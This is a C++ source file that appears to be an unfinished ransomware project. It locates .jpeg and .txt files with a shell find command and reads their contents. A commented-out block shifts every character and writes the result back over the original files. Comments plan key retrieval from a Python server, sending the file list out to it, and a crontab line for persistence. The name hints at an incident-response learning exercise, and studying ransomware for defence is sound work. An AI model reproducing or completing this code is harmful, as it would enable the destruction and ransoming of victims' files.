#include <string>
#include <iostream>
#include <fstream>
#include <vector>
using namespace std;
// *** TODO *** - Move Functions into Header File.

//Function to read locations and push them into a vector.
bool getFileContents(std::string fileName, std::vector<std::string> & fileContents){  

    ifstream in(fileName);  
    if(!in){
        cerr << "Cannot open the File : " << fileName << endl;
        return false;
    }
    string str;    
    while (getline(in, str)){        
        if(str.size() > 0)
            fileContents.push_back(str);
    }    
    in.close();
    return true;
}

// *** TODO *** - Make GPG Encryption.
void basicEncryptContent(std::string& content){
	for(char& chr : content){
		chr = chr + 1;
	}
}

void basicDecryptContent(std::string& content){
	for(char& chr : content){
		chr = chr - 1;
	}
}


// *** TODO *** - PART 3
std::vector<std::string> checkExistingLocations(std::vector<std::string> & fileContents){
	return fileContents;
}





int main(){  

	std::vector<std::string> fileLocationsVector;
	std::vector<std::string> temporaryVector; //Can remove temporary vector if in function?
	std::vector<std::vector<std::string>> fileContentVector;

	// -------------------

	// Fuction to populate a vector with the locations that have already been encrypted. Use this to remove those from the fileLocationsVector.

	// ------------------

	//PART ONE --- FIND FILES --- TOOOODOOOOOO - Expand Big Time
	system("find . -type f \\( -name \"*.jpeg\" -o -name \"*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.	
	
	if(getFileContents("fileLocations", fileLocationsVector)){		 // Read file locations into a string vector.
		for(string& location : fileLocationsVector){
			if(getFileContents(location, temporaryVector)){
				fileContentVector.push_back(temporaryVector);
				temporaryVector.clear();		
			}			
		}

	/*	// ENCRYPT
		for(vector<std::string>& a: fileContentVector){
			for(string& b : a){
				basicEncryptContent(b);
			}
		}

		// DECRYPT
		for(vector<std::string>& a: fileContentVector){
			for(string& b : a){
				basicDecryptContent(b);
			}
		}    

		// UPDATE FILES
		ofstream myFile;
		for(int i = 0; i < fileContentVector.size(); i++){  //loop through vector<vectors>(3)
			myFile.open(fileLocationsVector[i]);
			for(int j = 0; j < fileContentVector[i].size(); j++){ //loop through contents of files line by line.
				myFile << fileContentVector[i][j] << '\n';
				
			}
			myFile.close();			
		}	*/		
    	
    }

	

	// *** TODO *** - Check vector against Python vector. 

    //PART THREE --- PYTHON SERVER ---

    //Get Key from Python Server.
    //Check list of destinations from Server. Pass into a vector.
    //Send list of files to Python.


    //PART FOUR --- PERSISTENCE
    //Using crontab (1 * * * * cd /home/chronks/Desktop/IRProject && ./ransomProject)

	
    return 0;
}